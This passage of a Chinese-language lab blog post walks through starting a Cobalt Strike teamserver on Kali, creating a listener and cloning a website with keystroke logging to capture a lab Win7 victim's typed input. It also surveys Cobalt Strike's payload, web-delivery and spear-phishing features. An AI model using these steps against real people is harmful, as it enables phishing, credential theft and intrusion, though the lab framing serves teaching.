</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali/Desktop/Tools/Cobalt Strike<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# <span class=nb>cd</span> coablt_strike_4.5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# chmod <span class=m>777</span> *
</span></span></code></pre></td></tr></table></div></div><ul><li><p><strong>chmod</strong> = <strong>ch</strong>ange <strong>mod</strong>e（改变模式）</p></li><li><p><strong>777</strong> = 权限的数字表示法</p><ul><li><p><strong>第一个数字</strong>：文件所有者（owner）的权限</p></li><li><p><strong>第二个数字</strong>：所属用户组（group）的权限</p></li><li><p><strong>第三个数字</strong>：其他用户（others）的权限</p></li></ul></li><li><p>每个数字由三个权限值相加组成：</p><ul><li><p><strong>4</strong> = 读取权限（Read）</p></li><li><p><strong>2</strong> = 写入权限（Write）</p></li><li><p><strong>1</strong> = 执行权限（eXecute）</p></li></ul></li><li><p>777 的具体含义：<code>7 = 4 + 2 + 1</code>，即拥有所有权限</p><ul><li><p><strong>所有者</strong>：读 + 写 + 执行（7）</p></li><li><p><strong>所属组</strong>：读 + 写 + 执行（7）</p></li><li><p><strong>其他用户</strong>：读 + 写 + 执行（7）</p></li></ul></li></ul><h4 id=生成cobalt-strike服务器组>生成Cobalt Strike服务器组</h4><p>设置服务器IP和密码（CS服务器在kali的50050端口监听），创建组服务器实例</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# ./teamserver 192.168.10.135 admin
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Will use existing X509 certificate and keystore <span class=o>(</span><span class=k>for</span> SSL<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Team server is up on 0.0.0.0:50050
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> SHA256 <span class=nb>hash</span> of SSL cert is: 7eac4fdf25b2e55d39a7d9fcccc00978b95a7639a78a2c893bd2f6aac3637fb8
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listener: Listener started!
</span></span></code></pre></td></tr></table></div></div><h4 id=打开cobalt-strike客户端并连接服务器组>打开Cobalt Strike客户端并连接服务器组</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# ./cobaltstrike
</span></span></code></pre></td></tr></table></div></div><p>打开Cobal Strike，用刚才设置的密码和IP连接到用户组。Cobalt Strike支持多设备同时登录服务器。</p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1.png width=451 height=336 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1_hu_dfd277f9c3886724.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1_hu_7adff82c56280f88.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=134 data-flex-basis=322px></p><h4 id=创建监听器>创建监听器</h4><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/2.png width=756 height=535 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/2_hu_fda38b9c08f2b636.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/2_hu_2e8ceeeb629cb410.png 1024w" loading=lazy alt=2 class=gallery-image data-flex-grow=141 data-flex-basis=339px></p><p>打开监听器选项，点击添加</p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/3.png width=726 height=542 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/3_hu_615b68a541da84ce.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/3_hu_75b47fa3a0653c98.png 1024w" loading=lazy alt=3 class=gallery-image data-flex-grow=133 data-flex-basis=321px></p><p>HTTP地址为Kali地址，HTTP端口为钓鱼网站端口。添加监听器后，CS将在Kali的80端口上持续监听</p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/4.png width=771 height=322 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/4_hu_4e8ab27613210910.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/4_hu_ec7f5d2c9270931e.png 1024w" loading=lazy alt=4 class=gallery-image data-flex-grow=239 data-flex-basis=574px></p><h4 id=网站克隆与web日志>网站克隆与Web日志</h4><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/5.png width=765 height=520 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/5_hu_288c220c0dffa191.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/5_hu_45a6d554b5da9af5.png 1024w" loading=lazy alt=5 class=gallery-image data-flex-grow=147 data-flex-basis=353px></p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/6.png width=772 height=527 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/6_hu_ffb2ad471411bcb7.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/6_hu_48f3c5c03aab573f.png 1024w" loading=lazy alt=6 class=gallery-image data-flex-grow=146 data-flex-basis=351px></p><p>“克隆URL”中填写要伪装的网站，这里只支持HTTP协议。“本地HOST”为本地Kali的IP地址，也是伪装网址的IP地址；“本地端口”为伪装网址的运行端口，与监听器相一致；开启键盘记录</p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/7.png width=772 height=523 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/7_hu_29b282956dc8cae.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/7_hu_74a13f5a50e50d70.png 1024w" loading=lazy alt=7 class=gallery-image data-flex-grow=147 data-flex-basis=354px></p><p>最终访问地址为http://192.168.10.135:80/。由于网络适配器为NAT模式。因此所有NAT连接的虚拟机以及宿主机都可访问该页面。</p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/8.png width=765 height=528 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/8_hu_78e0ec527b90416.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/8_hu_4c8b308905dbb9a4.png 1024w" loading=lazy alt=8 class=gallery-image data-flex-grow=144 data-flex-basis=347px></p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/9.png width=770 height=526 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/9_hu_633d48dec21a7da0.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/9_hu_47d82424b044b855.png 1024w" loading=lazy alt=9 class=gallery-image data-flex-grow=146 data-flex-basis=351px></p><p>打开Web日志。</p><h4 id=靶机访问钓鱼网站>靶机访问钓鱼网站</h4><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/10.png width=796 height=561 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/10_hu_fed279ba64956bd.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/10_hu_6ea032db29babd84.png 1024w" loading=lazy alt=10 class=gallery-image data-flex-grow=141 data-flex-basis=340px>在Win7的浏览器中访问伪装网址，输入Kali</p><h4 id=键盘记录>键盘记录</h4><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/11.png width=768 height=527 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/11_hu_131a8edf5c77aa3c.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/11_hu_a2edf1ef002e4be7.png 1024w" loading=lazy alt=11 class=gallery-image data-flex-grow=145 data-flex-basis=349px></p><p>Web日志中打印Win7的键盘输入。该手段用于获取用户的密码等敏感信息。</p><h3 id=cs菜单功能概览>CS菜单功能概览</h3><h4 id=视图>视图</h4><p>此菜单主要用于管理和查看在后渗透阶段（Post-Exploitation）收集到的各类数据。</p><ul><li><strong>应用程序 (Applications)</strong>：显示由“系统分析器（System Profiler）”收集到的目标浏览器信息，包括浏览器版本、Flash版本、Java版本等，帮助你判断目标有哪些可被利用的客户端漏洞。</li><li><strong>密码凭证 (Credentials)</strong>：这是一个中央数据库，存储所有通过 <code>hashdump</code>、<code>mimikatz</code> 或钓鱼攻击获取到的用户名、密码、NTLM 哈希及令牌。</li><li><strong>下载列表 (Downloads)</strong>：记录所有从受控主机下载到 Team Server 的文件。你可以在这里右键将文件保存到本地。</li><li><strong>事件日志 (Event Log)</strong>：整个团队的“聊天室”和审计中心。记录了谁上线了、执行了什么关键命令，以及团队成员之间的即时消息沟通。</li><li><strong>键盘记录 (Keystrokes)</strong>：集中展示通过 <code>keylogger</code> 命令抓取到的所有目标击键记录。</li><li><strong>代理转发 (Proxy Pivots)</strong>：管理 SOCKS 代理和反向端口转发。当你想利用受控主机作为跳板攻击内网其他机器时，在这里配置代理信息。</li><li><strong>屏幕截图 (Screenshots)</strong>：展示所有从 Beacon 发回的屏幕截图。支持缩略图预览，方便快速查看目标当前的操作界面。</li><li><strong>脚本控制台 (Script Console)</strong>：用于加载和调试 <strong>Aggressor Script</strong>（CS 的自动化脚本语言）。你可以在这里看到脚本运行的输出或错误信息。</li><li><strong>目标列表 (Targets)</strong>：列出当前网络中所有已知的计算机及其元数据（IP、系统版本等）。你可以通过扫描或导入方式增加目标。</li><li><strong>Web日志 (Web Log)</strong>：记录 CS 内置 Web 服务器的所有访问请求。包括谁访问了你的钓鱼页面、下载了什么文件。</li></ul><h4 id=攻击>攻击</h4><p>该菜单是 CS 的核心功能区，分为载荷生成、Web 渗透和邮件钓鱼三大类。</p><ul><li><p><strong>生成后门 (Packages)</strong></p><p>用于创建各种形式的初始控制载荷（Payload）。</p><ul><li><p><strong>HTA文档</strong>：生成 <code>.hta</code> 后缀的 HTML 应用程序。它常通过浏览器下载执行，利用 VBScript 或 JScript 在系统底层运行 Beacon。</p></li><li><p><strong>Office宏</strong>：生成一段 VBA 代码，你可以将其嵌入 Word 或 Excel 文档中。当受害者点击“启用宏”时，就会触发上线。</p></li><li><p><strong>Payload生成器</strong>：最基础的工具。它可以将 Beacon 生成各种格式的原始数据（Raw Shellcode），或者生成 C、C#、Java、Python 等语言的源代码供你二次开发。</p></li><li><p><strong>Windows可执行程序</strong>：生成一个 Staged（分阶段）的 EXE 或 DLL 文件。这种后门体积小，运行时会先连接服务器下载完整的 Beacon。</p></li><li><p><strong>Windows可执行程序(Stageless)</strong>：生成一个 Stageless（不分阶段）的后门。它包含完整的 Beacon 功能，虽然体积较大，但在复杂的网络环境下更稳定且更难被流量监控发现。</p></li></ul></li><li><p><strong>Web钓鱼 (Web Drive-by)</strong></p><p>利用 CS 内置的 Web 服务器进行自动化 Web 攻击。</p><ul><li><strong>站点管理 (Manage)</strong>：查看并管理当前所有正在运行的 Web 服务（克隆的页面、托管的文件等）。</li><li><strong>网站克隆 (Clone Site)</strong>：输入一个网址（如公司内网登录页），CS 会克隆该页面。你还可以配置它抓取用户输入的表单数据（如账号密码）。</li><li><strong>文件托管 (Host File)</strong>：简单的 Web 服务器功能，用于把你的木马或工具挂在网上供目标下载。</li><li><strong>Web投递 (Web Delivery)</strong>：提供一种“一键上线”的方案。它生成一个 PowerShell、Python 或 Bitsadmin 命令，只要在目标机器运行这行命令，即可远程下载执行 Beacon。</li><li><strong>签名/智能 Applet 攻击</strong>：利用旧版本 Java 的漏洞或诱导用户点击运行 Java 插件。<em>注意：由于现代浏览器已不再支持 Java 插件，这些功能在实战中已基本过时。</em></li><li><strong>信息收集 (System Profiler)</strong>：生成一个隐藏的探测链接。当用户点击时，它会静默收集该用户的系统环境信息，并存入“视图 -> 应用程序”中。</li></ul></li><li><p><strong>邮件钓鱼 (Spear Phish)</strong></p><p>这是一个专门的钓鱼邮件发送平台。</p><ul><li>导入邮件模板和目标邮箱列表。</li><li>配置 SMTP 发信服务器。</li><li>将上述“生成后门”或“Web钓鱼”生成的链接/附件自动注入邮件并群发。</li></ul></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/msfvenom/>Msfvenom</a>
<a href=/tags/shell/>Shell</a>
<a href=/tags/windowsl/>Windowsl</a>
<a href=/tags/cs/>CS</a></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{const e=[".main-article",".widget--toc"];e.forEach(e=>{const t=document.querySelector(e);t&&renderMathInElement(t,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})})</script></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/><div class=article-details><h2 class=article-title>【攻防实践】靶场搭建</h2></div></a></article><article class=has-image><a href=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/><div class=article-image><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010.992c28af9d4dc6152f59316c33d36a29_hu_c9fb065fb8253e47.png width=250 height=150 loading=lazy alt="Featured image of post 【攻防实践】MS17-010漏洞利用" data-hash="md5-mSwor51NxhUvWTFsM9NqKQ=="></div><div class=article-details><h2 class=article-title>【攻防实践】MS17-010漏洞利用</h2></div></a></article><article class=has-image><a href=/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/><div class=article-image><img src=/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/cover.e5a9a8588c5efdb3863784d243c8f49c_hu_b42508f134fa3934.png width=250 height=150 loading=lazy alt="Featured image of post 【格基加密】SL3PAKE协议" data-hash="md5-5amoWIxe/bOGN4TSQ8j0nA=="></div><div class=article-details><h2 class=article-title>【格基加密】SL3PAKE协议</h2></div></a></article><article><a href=/p/kali-toolkitnmapnetwork-mapper/><div class=article-details><h2 class=article-title>【Kali Toolkit】Nmap（Network Mapper）</h2></div></a></article><article><a href=/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/><div class=article-details><h2 class=article-title>渗透测试基础</h2></div></a></article></div></div></aside><script src=https://utteranc.es/client.js repo=leuco-yuu/blog-comments issue-term=pathname crossorigin=anonymous async></script><style>.utterances{max-width:unset}</style><script>let utterancesLoaded=!1;function setUtterancesTheme(e){let t=document.querySelector(".utterances iframe");t&&t.contentWindow.postMessage({type:"set-theme",theme:`github-${e}`},"https://utteranc.es")}addEventListener("message",e=>{if(e.origin!=="https://utteranc.es")return;utterancesLoaded=!0,setUtterancesTheme(document.documentElement.dataset.scheme)}),window.addEventListener("onColorSchemeChange",e=>{if(!utterancesLoaded)return;setUtterancesTheme(e.detail)})</script><footer class=site-footer><section class=copyright>&copy;
2025 -
2026 Leuco(leucoyuu@163.com)</section><section class=powerby>Embrace Bit Art<br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.29c987cab5419174d4dc85c2a56544a08027cc7f77efb5749447a3e80f85a03d.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>